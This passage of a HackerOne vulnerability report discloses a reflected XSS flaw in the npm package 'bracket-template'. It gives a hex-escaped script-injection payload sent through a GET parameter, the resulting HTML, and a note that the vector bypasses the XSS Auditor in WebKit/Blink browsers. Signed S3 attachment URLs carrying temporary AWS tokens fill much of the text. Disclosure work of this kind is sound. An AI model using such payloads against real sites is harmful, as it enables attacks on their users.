data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/264/369/380fbd02d94f877178129f6ec4c2a0bc011e5fbe/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222540Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=f36b27d7703e11bee32034446694f9f95529aa8a17b417bac09de8608b00323d\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/264/369/380fbd02d94f877178129f6ec4c2a0bc011e5fbe/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222540Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=f36b27d7703e11bee32034446694f9f95529aa8a17b417bac09de8608b00323d\" class=\"markdown-inline-image\"></a></p>\n\n<ul>\n<li>this time, use following payload: <code>http://localhost:8080/?name=bl4de\\x3cscript\\x3econsole.log(\\x22uh\\x20oh,\\x20XSS...\\x20:(\\x22)\\x3c\\x2fscript\\x3e</code> and see the result in browser dev tools console:</li>\n</ul>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"3.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/264/370/476deed12b4d2d1b03e8420ba470c80f8c1b2cf8/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222540Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=efc271b73cdfd7ca5b1771f95606589a322bb88bccee058d1e8c3d68eca2ce97\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/264/370/476deed12b4d2d1b03e8420ba470c80f8c1b2cf8/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222540Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=efc271b73cdfd7ca5b1771f95606589a322bb88bccee058d1e8c3d68eca2ce97\" class=\"markdown-inline-image\"></a></p>\n\n<p>When we investigate HTML returned from the server, we can notice using <code>\\x[hex][hex]</code> notation allows to inject any HTML special character and crafts XSS payload:</p>\n<pre class=\"highlight plaintext\"><code>&lt;strong&gt;Hello bl4de&lt;script&gt;console.log(&quot;uh oh, XSS... :(&quot;)&lt;/script&gt;&lt;/strong&gt;\n</code></pre>\n<p>Also, I have noticed that this vector is not detected by built-in XSS protection (XSS Auditor) in Blink/WebKit based browsers (Chromium, Safari, Chrome, Opera), which causes additional risk for anyone who uses <code>bracket-template</code> in production application.</p>\n\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<p>This issue was found and tested with following setup:</p>\n\n<ul>\n<li>macOS HighSierra 10.13.3</li>\n<li>Node.js v.8.9.3</li>\n<li>npm v. 5.5.1</li>\n<li>Chromium 66.0.3342.0, Safari 11.03 (with XSS Auditor enabled), Chrome 64.0.3282.167 (with XSS Auditor enabled)</li>\n</ul>\n\n<h2 id=\"wrap-up\">Wrap up</h2>\n\n<ul>\n<li>I contacted the maintainer to let him know: No</li>\n<li>I opened an issue in the related repository: No</li>\n</ul>\n\n<p>Regards,</p>\n\n<p>Rafal &#39;bl4de&#39; Janicki</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>This issue can be used by malicious user to exploit Reflected XSS against application  which outputs variables passed via GET parameters directly in template(s) without any sanitization.</p>\n", 
    "severity_rating": "high", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://nodejs.org/en/security/", 
            "about": "This program is used to handle vulnerabilities in the Node.js ecosystem.", 
            "twitter_handle": "", 
            "name": "Node.js third-party modules"
        }, 
        "handle": "nodejs-ecosystem", 
        "url": "https://hackerone.com/nodejs-ecosystem", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/023/949/309112251b444244d95977d1299148aae6482789_small.?1508679627", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 23949, 
        "default_currency": "usd"
    }, 
    "is_published": false
}